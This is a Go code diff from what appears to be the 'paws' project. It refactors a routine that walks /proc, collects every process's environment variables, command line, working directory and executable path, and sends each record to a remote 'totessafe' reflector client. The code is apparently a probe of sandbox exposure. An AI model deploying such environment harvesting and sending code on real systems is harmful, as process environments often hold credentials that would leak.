@@ -12,16 +12,9 @@ import (
 	"strconv"
 	"strings"
 
+	"github.com/jessfraz/paws/moarpackets/types"
 	"github.com/jessfraz/paws/totessafe/reflector"
 )
-
-type procBlob struct {
-	PID     int      `json:"pid,omitempty"`
-	Env     []string `json:"env,omitempty"`
-	Cmdline []string `json:"cmdline,omitempty"`
-	Cwd     string   `json:"cwd,omitempty"`
-	Exe     string   `json:"exe,omitempty"`
-}
 
 func getProcInfo(client *reflector.InternalReflectorClient) {
 	// Get information from the /proc filesystem for the processes.
@@ -31,23 +24,26 @@ func getProcInfo(client *reflector.InternalReflectorClient) {
 		return
 	}
 
-	b, err := json.Marshal(data)
-	if err != nil {
-		log.Printf("marshal /proc data failed: %v", err)
-		return
-	}
+	// Iterate over the pids and send to our client
+	for _, process := range data {
+		b, err := json.Marshal(process)
+		if err != nil {
+			log.Printf("marshal /proc data failed: %v", err)
+			return
+		}
 
-	blob := &reflector.PawsBlob{
-		Data: string(b),
-	}
-	if _, err = client.Client.Set(context.TODO(), blob); err != nil {
-		log.Printf("sending proc data to totessafe client failed: %v", err)
+		blob := &reflector.PawsBlob{
+			Data: string(b),
+		}
+		if _, err = client.Client.Set(context.TODO(), blob); err != nil {
+			log.Printf("sending proc data to totessafe client failed: %v", err)
+		}
 	}
 }
 
-func walkProc() (map[int]procBlob, error) {
-	// Initialize our procBlob strcut array.
-	pb := map[int]procBlob{}
+func walkProc() (map[int]types.ProcBlob, error) {
+	// Initialize our proc blob strcut array.
+	pb := map[int]types.ProcBlob{}
 
 	// Walk all files in /proc and get the env for each process. :)
 	filepath.Walk("/proc", func(path string, fi os.FileInfo, err error) error {
@@ -98,16 +94,16 @@ func walkProc() (map[int]procBlob, error) {
 			log.Printf("[/proc]: converting %q to int for path %s failed: %v", pidstr, path, err)
 			return nil
 		}
-		// Initialize our pid int the procBlob map if it does not exist.
+		// Initialize our pid int the proc blob map if it does not exist.
 		p, ok := pb[pid]
 		if !ok {
-			p = procBlob{
+			p = types.ProcBlob{
 				PID: pid,
 			}
 		}
 
 		// At this point we should have an actual env file that we want.
-		// Let's parse it and add it to our procBlob array.
+		// Let's parse it and add it to our proc blob array.
 		var file []byte
 		if filepath.Base(path) != "cwd" {
 			// Read the file.
@@ -152,7 +148,7 @@ func walkProc() (map[int]procBlob, error) {
 			return nil
 		}
 
-		// Append this pid's environ to the procBlob array.
+		// Append this pid's environ to the proc blob array.
 		pb[pid] = p
 
 		return nil
